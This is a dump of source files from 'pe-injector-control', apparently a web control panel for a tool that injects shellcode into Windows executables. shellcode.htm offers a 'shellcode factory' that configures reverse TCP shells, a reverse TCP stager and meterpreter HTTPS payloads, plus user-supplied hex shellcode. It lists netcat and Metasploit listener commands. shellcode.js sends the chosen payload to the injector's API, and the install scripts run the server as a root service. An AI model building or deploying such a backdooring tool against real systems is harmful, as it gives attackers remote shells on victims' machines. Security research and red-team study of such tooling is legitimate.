Ic=a.document.documentElement;function Jc(a){return n.isWindow(a)?a:9===a.nodeType&&a.defaultView}n.offset={setOffset:function(a,b,c){var d,e,f,g,h,i,j,k=n.css(a,"position"),l=n(a),m={};"static"===k&&(a.style.position="relative"),h=l.offset(),f=n.css(a,"top"),i=n.css(a,"left"),j=("absolute"===k||"fixed"===k)&&(f+i).indexOf("auto")>-1,j?(d=l.position(),g=d.top,e=d.left):(g=parseFloat(f)||0,e=parseFloat(i)||0),n.isFunction(b)&&(b=b.call(a,c,h)),null!=b.top&&(m.top=b.top-h.top+g),null!=b.left&&(m.left=b.left-h.left+e),"using"in b?b.using.call(a,m):l.css(m)}},n.fn.extend({offset:function(a){if(arguments.length)return void 0===a?this:this.each(function(b){n.offset.setOffset(this,a,b)});var b,c,d=this[0],e={top:0,left:0},f=d&&d.ownerDocument;if(f)return b=f.documentElement,n.contains(b,d)?(typeof d.getBoundingClientRect!==U&&(e=d.getBoundingClientRect()),c=Jc(f),{top:e.top+c.pageYOffset-b.clientTop,left:e.left+c.pageXOffset-b.clientLeft}):e},position:function(){if(this[0]){var a,b,c=this[0],d={top:0,left:0};return"fixed"===n.css(c,"position")?b=c.getBoundingClientRect():(a=this.offsetParent(),b=this.offset(),n.nodeName(a[0],"html")||(d=a.offset()),d.top+=n.css(a[0],"borderTopWidth",!0),d.left+=n.css(a[0],"borderLeftWidth",!0)),{top:b.top-d.top-n.css(c,"marginTop",!0),left:b.left-d.left-n.css(c,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||Ic;while(a&&!n.nodeName(a,"html")&&"static"===n.css(a,"position"))a=a.offsetParent;return a||Ic})}}),n.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(b,c){var d="pageYOffset"===c;n.fn[b]=function(e){return J(this,function(b,e,f){var g=Jc(b);return void 0===f?g?g[c]:b[e]:void(g?g.scrollTo(d?a.pageXOffset:f,d?f:a.pageYOffset):b[e]=f)},b,e,arguments.length,null)}}),n.each(["top","left"],function(a,b){n.cssHooks[b]=yb(k.pixelPosition,function(a,c){return c?(c=xb(a,b),vb.test(c)?n(a).position()[b]+"px":c):void 0})}),n.each({Height:"height",Width:"width"},function(a,b){n.each({padding:"inner"+a,content:b,"":"outer"+a},function(c,d){n.fn[d]=function(d,e){var f=arguments.length&&(c||"boolean"!=typeof d),g=c||(d===!0||e===!0?"margin":"border");return J(this,function(b,c,d){var e;return n.isWindow(b)?b.document.documentElement["client"+a]:9===b.nodeType?(e=b.documentElement,Math.max(b.body["scroll"+a],e["scroll"+a],b.body["offset"+a],e["offset"+a],e["client"+a])):void 0===d?n.css(b,c,g):n.style(b,c,d,g)},b,f?d:void 0,f,null)}})}),n.fn.size=function(){return this.length},n.fn.andSelf=n.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return n});var Kc=a.jQuery,Lc=a.$;return n.noConflict=function(b){return a.$===n&&(a.$=Lc),b&&a.jQuery===n&&(a.jQuery=Kc),n},typeof b===U&&(a.jQuery=a.$=n),n});

```

`pe-injector-control/html/js/shellcode.js`:

```js
//----------------------------------------------------------------------------//
//  active when finished loading                                              //
//----------------------------------------------------------------------------//
$(document).ready(function(){

	/* 
	 * send shellcode
	 */
	$('button').on('click', function () {
		var thisID = $(this).attr('id');
		var baseID = thisID.replace("_selectshell","");
		
		/* no Input and Button */
		if(!thisID.match(/_selectshell$/)) {
			//alert('wrong ID: '+thisID); // DEBUG!!!
			return;
		}

		/* get text input */
		var name = $('#'+baseID+'_name').val();
		var host = $('#'+baseID+'_host').val();
		var port = $('#'+baseID+'_port').val();
		var textarea = $('#'+baseID+'_textarea');
		if (textarea != null) {
		  textarea = textarea.val()
		}

		/* get radio */
    var radioval = $("input[name='"+baseID+"_system']:checked").val();
		
		/* get checkbox */
    var xor = document.getElementById(baseID+'_xor').checked;  // return true|false
		
		/* disable button */
		$('#'+thisID).addClass("disabled");
		
		/* create xmlhttp object */
		var xmlhttp=new XMLHttpRequest();
		
		/* set onreadystatechange function */
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4 && xmlhttp.status==200) {
				// enable button
				$('#'+thisID).removeClass("disabled");
				// alert server request
				resttxt = xmlhttp.responseText;
				if("OK" != resttxt) {
					alert(resttxt);
				}else {
				  window.location.reload(); 
				}
			}
		}
		
		/* send request */
		xmlhttp.open("POST","/api/set/shell",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("name="+name+"&host="+host+"&port="+port+"&system="+radioval+"&shellselect="+baseID+"&textarea="+textarea+"&xor="+xor);
	})//-------------------------------------------------

});

```

`pe-injector-control/html/music/licensing.txt`:

```txt
source: http://ericskiff.com/music/

Licensing:
----------
All songs are released under a Creative Commons Attribution License, 
please feel free to use them in your projects, games, podcasts, videos, 
or whatever you like, just be sure to let me know so I can link back to you!
```

`pe-injector-control/html/settings.htm`:

```htm
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ^ this 3 Meta-Tags firstn;  -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>peinjector-control</title>

    <!-- Bootstrap-CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap-Theme -->
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <!-- second Theme -->
    <link href="css/starter-template.css" rel="stylesheet">
  </head>

  <body role="document">

    <!-- Navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Navigation ein-/ausblenden</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">peinjector-control</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="index.htm">start</a></li>
            <li><a href="injector.htm">injector</a></li>
            <li><a href="shellcode.htm">shellcode</a></li>
            <li class="active"><a href="settings.htm">settings</a></li>
            <li><a href="about.htm">about</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><!-- END Navbar -->


    <!-- main container -->
    <div class="container theme-showcase" role="main">
      

      <!-- Connections -->
      <div class="page-header">
        <h2>connections</h2>
      </div>

      <div class="row">  <!-- row: Injector -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">injector IP address</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-7">
                <div class="input-group">
                  <input type="text" id="controlip_TXT1" class="form-control" placeholder="loading...">
                  <span class="input-group-btn">
                    <button type="button" id="controlip_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-5">
                <p>IP of the server you want to configure.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">injector control port</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-7">
                <div class="input-group">
                  <input type="number" id="controlport_write_TXT1" class="form-control" placeholder="loading..." min="1" max="65535">
                  <span class="input-group-btn">
                    <button type="button" id="controlport_write_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-5">
                <p>Port of the server you want to configure.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row: Token -->
        <div class="col-sm-12">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">access token</h3>
            </div>
            <div class="panel-body">
              <div class="col-lg-9">
                <div class="input-group input-group-sm">
                  <input type="text" id="token_write_TXT1" class="form-control" placeholder="loading..." maxlength="64">
                  <span class="input-group-btn">
                    <button type="button" id="token_write_CLS" class="btn btn-danger"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span> Clear</button>
                    <button type="button" id="token_write_TXT2" class="btn btn-success"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-lg-3">
                <p>API Key</p>
              </div>
            </div>
          </div>
        </div>
      </div>  <!-- END row --> 

      <!-- ADMIN -->
      <div class="page-header">
        <h2>admin</h2>
      </div>

      <div class="row">  <!-- row: Injector -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">set password for user 'admin'</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-7">
                <div class="input-group">
                  <input type="password" id="adminpass_TXT1" class="form-control" placeholder="********">
                  <span class="input-group-btn">
                    <button type="button" id="adminpass_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-5">
                <p>Set a password for the user 'admin'.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">enable authentication</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="enableauth_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="enableauth_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Enable/Disable basic authentication.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

    </div> <!-- END main container -->


    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>



    <!-- Bootstrap-JavaScript
    ================================================== -->
    <script src="js/jquery-2.1.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <!-- My JavaScript
    ================================================== -->
    <script src="js/injector.js"></script>
    <script src="js/getconfig.js"></script>
    
  </body>
</html>

```

`pe-injector-control/html/shellcode.htm`:

```htm
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ^ this 3 Meta-Tags firstn;  -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>peinjector-control</title>

    <!-- Bootstrap-CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap-Theme -->
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <!-- second Theme -->
    <link href="css/starter-template.css" rel="stylesheet">
  </head>

  <body role="document">

    <!-- Navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Navigation ein-/ausblenden</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">peinjector-control</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="index.htm">start</a></li>
            <li><a href="injector.htm">injector</a></li>
            <li class="active"><a href="shellcode.htm">shellcode</a></li>
            <li><a href="settings.htm">settings</a></li>
            <li><a href="about.htm">about</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><!-- END Navbar -->


    <!-- main container -->
    <div class="container theme-showcase" role="main">
      
      <div class="page-header">
        <h2>active shellcode</h2>
      </div>
      
      <!-- live Status -->
      <div class="row">  <!-- row 3 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">x86 shellcode</div>
            <div class="panel-body">
              Name: <span id="status_32bit_name">loading...</span><br>
              Counter: <span id="status_32bit_counter">loading...</span>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">x64 shellcode</div>
            <div class="panel-body">
              Name: <span id="status_64bit_name">loading...</span><br>
              Counter: <span id="status_64bit_counter">loading...</span>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 
      
      
      <div class="page-header">
        <h2>shellcode factory</h2>
      </div>
      
      <!-- module 1 -->
      <div class="panel panel-primary">
        <div class="panel-heading">reverse shell (tcp)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="reverse_shell_tcp_name" value="reverse shell (tcp)" class="form-control">
              </div>
              <div class="form-group">
                <label>host</label>
                <input type="text" id="reverse_shell_tcp_host" class="form-control">
              </div>
              <div class="form-group">
                <label>port</label>
                <input type="number" id="reverse_shell_tcp_port" class="form-control" min="1" max="65535">
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="reverse_shell_tcp_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="reverse_shell_tcp_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="reverse_shell_tcp_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="reverse_shell_tcp_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  metasploit windows/shell_reverse_tcp<br>
                  Spawns a reverse shell (Windows cmd, via tcp) which will try to connect to the given host:port. 
                  Host must be an IPv4 address, the port must be between 1 and 65535.
                </p>
                <p>
                  <u>listen command</u><br>
                  <i>nc -lvp 1337</i>
                </p>
                <p>
                  <u>alternativ listen command</u><br>
                  <i>use payload/windows/shell_reverse_tcp<br>
                  msf payload(shell_reverse_tcp) > set lhost 0.0.0.0<br>
                  msf payload(shell_reverse_tcp) > set lport 1337<br>
                msf payload(shell_reverse_tcp) > run</i>
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="reverse_shell_tcp_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->
      
      
      <!-- module 2 -->
      <div class="panel panel-primary">
        <div class="panel-heading">reverse tcp stager (threaded)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="reverse_tcp_stager_threaded_name" value="reverse tcp stager (threaded)" class="form-control">
              </div>
              <div class="form-group">
                <label>host</label>
                <input type="text" id="reverse_tcp_stager_threaded_host" class="form-control">
              </div>
              <div class="form-group">
                <label>port</label>
                <input type="number" id="reverse_tcp_stager_threaded_port" class="form-control" min="1" max="65535">
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="reverse_tcp_stager_threaded_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="reverse_tcp_stager_threaded_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="reverse_tcp_stager_threaded_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="reverse_tcp_stager_threaded_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  Reverse tcp stager which will try to connect to the given host:port.
                  Can be used with windows/shell/reverse_tcp or windows/meterpreter/reverse_tcp payloads from metasploit.
                  Host must be an IPv4 address, the port must be between 1 and 65535.
                </p>
                <p>
                  <u>references</u><br>
                  <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" style="target-new: tab;">https://github.com/stephenfewer/ReflectiveDLLInjection</a><br>
                  <a href="https://github.com/rapid7/ReflectiveDLLInjection" target="_blank" style="target-new: tab;">https://github.com/rapid7/ReflectiveDLLInjection</a>
                </p>
                <p>
                  <u>listen commands</u><br>
                  <i>msf > use payload/windows/meterpreter/reverse_tcp<br>
                  msf payload(reverse_tcp) > set lhost 0.0.0.0<br>
                  msf payload(reverse_tcp) > set lport 1337<br>
                msf payload(reverse_tcp) > run</i>
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="reverse_tcp_stager_threaded_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->


      <!-- module 3 -->
      <div class="panel panel-primary">
        <div class="panel-heading">reverse meterpreter (https, threaded)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="reverse_meterpreter_https_threaded_name" value="reverse meterpreter (https, threaded)" class="form-control">
              </div>
              <div class="form-group">
                <label>host</label>
                <input type="text" id="reverse_meterpreter_https_threaded_host" class="form-control">
              </div>
              <div class="form-group">
                <label>port</label>
                <input type="number" id="reverse_meterpreter_https_threaded_port" class="form-control" min="1" max="65535">
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="reverse_meterpreter_https_threaded_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="reverse_meterpreter_https_threaded_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="reverse_meterpreter_https_threaded_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="reverse_meterpreter_https_threaded_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  Traditional meterpreter reverse https shellcode. Will try to connect to the given host:port. Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). 
                  Tunnel communication over HTTPS (Windows wininet)
                  Host must be an IPv4 address, the port must be between 1 and 65535.
                </p>
                <p>
                  <u>references</u><br>
                  <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" style="target-new: tab;">https://github.com/stephenfewer/ReflectiveDLLInjection</a><br>
                  <a href="https://github.com/rapid7/ReflectiveDLLInjection" target="_blank" style="target-new: tab;">https://github.com/rapid7/ReflectiveDLLInjection</a>
                </p>
                <p>
                  <u>listen commands</u><br>
                  <i>msf > use payload/windows/meterpreter/reverse_https<br>
                  msf payload(reverse_https) > set lhost 0.0.0.0<br>
                  msf payload(reverse_https) > set lport 1337<br>
                msf payload(reverse_https) > run</i>
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="reverse_meterpreter_https_threaded_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->
      
      <!-- module 4 -->
      <div class="panel panel-primary">
        <div class="panel-heading">user supplied shellcode</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="user_supplied_shellcode_name" value="user supplied shellcode" class="form-control">
              </div>
              <div class="form-group">
                <input type="hidden" id="user_supplied_shellcode_host" class="form-control" value="127.0.0.1">
              </div>
              <div class="form-group">
                <input type="hidden" id="user_supplied_shellcode_port" class="form-control" min="1" max="65535" value="1234">
              </div>
              <div class="form-group">
                <label>user supplied shellcode (HEXstring)</label>
                <textarea id="user_supplied_shellcode_textarea" class="form-control" rows="3"></textarea>
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="user_supplied_shellcode_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  User supplied shellcode. Just paste shellcode as hex string.
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="user_supplied_shellcode_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->
      
      <!-- module 5 -->
      <div class="panel panel-primary">
        <div class="panel-heading">user supplied shellcode (threaded)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="user_supplied_shellcode_threaded_name" value="user supplied shellcode (threaded)" class="form-control">
              </div>
              <div class="form-group">
                <input type="hidden" id="user_supplied_shellcode_threaded_host" class="form-control" value="127.0.0.1">
              </div>
              <div class="form-group">
                <input type="hidden" id="user_supplied_shellcode_threaded_port" class="form-control" min="1" max="65535" value="1234">
              </div>
              <div class="form-group">
                <label>user supplied shellcode (HEXstring)</label>
                <textarea id="user_supplied_shellcode_threaded_textarea" class="form-control" rows="3"></textarea>
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="user_supplied_shellcode_threaded_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_threaded_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_threaded_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="user_supplied_shellcode_threaded_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  User supplied shellcode. Just paste shellcode as hex string. It will be injected as new thread. Make sure to use a process safe exit function.
                </p>
                <p>
                  <u>references</u><br>
                  <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682659(v=vs.85).aspx" target="_blank" style="target-new: tab;">https://msdn.microsoft.com/en-us/library/windows/desktop/ms682659(v=vs.85).aspx</a><br>
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="user_supplied_shellcode_threaded_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->
      
      <!-- module 6 -->
      <div class="panel panel-primary">
        <div class="panel-heading">demo (nop)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="demo_nop_name" value="demo (nop)" class="form-control">
              </div>
              <div class="form-group">
                <input type="hidden" id="demo_nop_host" class="form-control" value="127.0.0.1">
              </div>
              <div class="form-group">
                <input type="hidden" id="demo_nop_port" class="form-control" min="1" max="65535" value="1234">
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="demo_nop_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="demo_nop_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="demo_nop_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="demo_nop_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  Injects a NOP (Debugging purposes)
                </p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="demo_nop_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->
      
      <!-- module 7 -->
      <div class="panel panel-primary">
        <div class="panel-heading">demo (calc)</div>
        <div class="panel-body">

          <!-- user input -->
          <div class="row">
            <div class="col-sm-4">
              <div class="form-group">
                <label>name</label>
                <input type="text" id="demo_calc_name" value="demo (calc)" class="form-control">
              </div>
              <div class="form-group">
                <input type="hidden" id="demo_calc_host" class="form-control" value="127.0.0.1">
              </div>
              <div class="form-group">
                <input type="hidden" id="demo_calc_port" class="form-control" min="1" max="65535" value="1234">
              </div>
              <div class="form-group">
                <div class="checkbox"><label><input type="hidden" id="demo_calc_xor"></label></div>
              </div>
              <div class="form-group">
                <label>architecture</label>
                <div class="radio"><label><input type="radio" name="demo_calc_system" value="x86x64" checked="checked">x86+x64</label></div>
                <div class="radio"><label><input type="radio" name="demo_calc_system" value="x86">x86 only</label></div>
                <div class="radio"><label><input type="radio" name="demo_calc_system" value="x64">x64 only</label></div>
              </div>
            </div>
            <div class="col-sm-2">
              &nbsp;
            </div>
            <div class="col-sm-6">
              <div class="form-group">
                <label>description</label>
                <p>
                  Injects a classic execute calc.exe shellcode
                </p>
                <p>
                  <u>references</u><br>
                  <a href="https://github.com/peterferrie/win-exec-calc-shellcode" target="_blank" style="target-new: tab;">https://github.com/peterferrie/win-exec-calc-shellcode</a><br>
                </p>
                <p>
              </div>
            </div>
          </div>

          <!-- button -->
          <div class="row">
            <div class="col-md-8">
              &nbsp;
            </div>
            <div class="col-md-4">
              <button type="button" class="btn btn-primary btn-lg center-block" id="demo_calc_selectshell">create and send shellcode</button>
            </div>
          </div>
          
        </div> <!-- END body -->
      </div> <!-- END modul -->

    </div> <!-- END main container -->

    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    

    <!-- Bootstrap-JavaScript
    ================================================== -->
    <script src="js/jquery-2.1.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <!-- My JavaScript
    ================================================== -->
    <script src="js/injector.js"></script>
    <script src="js/shellcode.js"></script>
    <script src="js/getconfig.js"></script>
    
  </body>
</html>

```

`pe-injector-control/install/peinjector-control_install.sh`:

```sh
#!/bin/sh

# peinjector-control install script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# Dependencies
apt-get install -y python3

# Check minimum python version
if [ $(python -c 'import sys; print(1 if sys.hexversion <= 34000000 else 0)') -eq 1 ] ; then
  echo "python 3.4 is required at least"
  exit 1
fi

# install start script
cp ./peinjector-control_start.sh /usr/local/bin/peinjector-control_start.sh
chmod a+x /usr/local/bin/peinjector-control_start.sh

# install stop script
cp ./peinjector-control_stop.sh /usr/local/bin/peinjector-control_stop.sh
chmod a+x /usr/local/bin/peinjector-control_stop.sh

# install service script
cp ./peinjector-control_service.sh /etc/init.d/peinjector-control
chmod a+x /etc/init.d/peinjector-control

# register service
update-rc.d peinjector-control defaults

# make working and log dir
mkdir /etc/peinjector-control
mkdir /var/log/peinjector-control

# Copy server & data
cd ..
cp -r ./* /etc/peinjector-control
# Remove install dir
rm -rf /etc/peinjector-control/install

# run server
service peinjector-control start

exit 0

```

`pe-injector-control/install/peinjector-control_service.sh`:

```sh
#!/bin/sh

### BEGIN INIT INFO
# Provides:          peinjector-control
# Required-Start:    $all
# Required-Stop:     $all
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: peinjector-control server
# Description:       Provides peinjector-control server as a service
#
### END INIT INFO

# peinjector-control service script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

case "$1" in
  start)
    echo "Start peinjector-control server"
    /usr/local/bin/peinjector-control_start.sh
    ;;
  stop)
    echo "Stop peinjector-control server"
    /usr/local/bin/peinjector-control_stop.sh
    ;;
  restart)
    echo "Restart peinjector-control server"
    /usr/local/bin/peinjector-control_stop.sh
    /usr/local/bin/peinjector-control_start.sh
    ;;
  *)
    echo "Usage: /etc/init.d/peinjector-control {start|stop|restart}"
    ;;
esac

exit 0
```

`pe-injector-control/install/peinjector-control_start.sh`:

```sh
#!/bin/sh

# peinjector-control start script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# set Log files and working dir
LOG_FILE=/var/log/peinjector-control/control.log
ERROR_FILE=/var/log/peinjector-control/control.err
WORKING_DIR=/etc/peinjector-control

# start server
cd $WORKING_DIR
((python3 ./peinjector_control.py) >> $LOG_FILE 2>> $ERROR_FILE </dev/null) &

exit 0
```

`pe-injector-control/install/peinjector-control_stop.sh`:

```sh
#!/bin/sh

# peinjector-control stop script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# kill peinjector
pkill -f peinjector_control.py

exit 0
```

`pe-injector-control/peinjector_control.py`:

```py
#!/usr/bin/env python3

# import lib
import argparse
import ssl
import http.server
import configparser
from platform import python_version
# import file
import ServerHandler


# constants
CONFIG_FILE = 'config.ini'
CONFIG_SECTION_WEB = 'WEBSERVER'
CONFIG_SECTION_INJ = 'INJECTOR'
